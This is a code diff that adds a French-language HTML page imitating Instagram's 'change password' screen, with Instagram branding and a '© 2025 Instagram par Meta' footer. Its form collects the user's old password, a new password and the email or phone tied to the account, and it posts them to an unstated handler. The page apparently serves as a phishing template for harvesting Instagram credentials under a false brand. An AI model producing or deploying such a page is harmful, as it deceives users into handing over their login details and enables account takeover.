@@ -1,1 +1,50 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Changer le mot de passe • Instagram</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  
+</head>
+<body>
 
+  <div class="card">
+    <div class="logo">Instagram</div>
+    <h1>Changer le mot de passe</h1>
+
+    <p class="info">
+      Pour des raisons de sécurité, veuillez entrer votre ancien mot de passe.
+    </p>
+
+    <form method="POST">
+      <div class="form-group">
+        <label for="ancien_mdp">Ancien mot de passe</label>
+        <input type="password" id="ancien_mdp" name="ancien_mdp" required autocomplete="off">
+      </div>
+
+      <div class="form-group">
+        <label for="nouveau_mdp">Nouveau mot de passe</label>
+        <input type="password" id="nouveau_mdp" name="nouveau_mdp" required autocomplete="off">
+      </div>
+
+      <div class="form-group">
+        <label for="confirme_mdp">Confirmer le nouveau mot de passe</label>
+        <input type="password" id="confirme_mdp" name="confirme_mdp" required autocomplete="off">
+      </div>
+
+      <div class="form-group">
+        <label for="email">Email ou téléphone associé</label>
+        <input type="text" id="email" name="email" required autocomplete="off">
+      </div>
+
+      <button type="submit">Changer le mot de passe</button>
+    </form>
+
+    <div class="footer">
+      © 2025 Instagram par Meta
+    </div>
+  </div>
+
+</body>
+</html>
